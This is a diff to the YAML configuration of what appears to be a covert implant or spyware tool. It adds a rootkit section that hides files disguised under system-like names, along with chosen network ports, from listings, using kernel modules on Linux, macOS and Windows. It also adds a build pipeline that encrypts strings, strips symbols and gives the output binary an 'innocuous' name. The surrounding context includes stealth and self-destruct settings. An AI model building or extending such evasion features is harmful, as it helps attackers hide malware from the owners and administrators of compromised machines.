@@ -382,6 +382,30 @@ stealth:
       end_hour: 18
     max_bandwidth_bps: 0            # 0 = unlimited
 
+# ── Rootkit Integration ───────────────────────────────────────────────
+# Kernel-level hiding via native C modules (Linux LKM, macOS dylib, Windows minifilter).
+# Requires root/admin privileges and platform-specific build tools.
+# Gracefully degrades if unavailable — user-space stealth still works.
+rootkit:
+  enabled: false
+  auto_compile: true                # compile native module from source if not prebuilt
+  hide_prefixes:                    # file prefixes to hide from directory listings
+    - ".com.apple.dt.instruments"
+    - ".dbus-session"
+    - "preferences.db"
+    - "cache.db"
+  hide_ports: []                    # TCP ports to hide from netstat/ss (list of integers)
+  dylib_path: ""                    # custom path to macOS interpose.dylib (empty = auto-detect)
+
+# ── Build Pipeline ────────────────────────────────────────────────────
+# Nuitka compilation + string encryption + symbol stripping.
+# Run: python -m build.pipeline --level hardened --output dist/
+build:
+  level: "standard"                 # standard | hardened | maximum
+  output_dir: "dist"
+  output_name: "system_service"     # innocuous binary name
+  entry_point: "main.py"
+
 self_destruct:
   secure_wipe: false
   remove_program: false
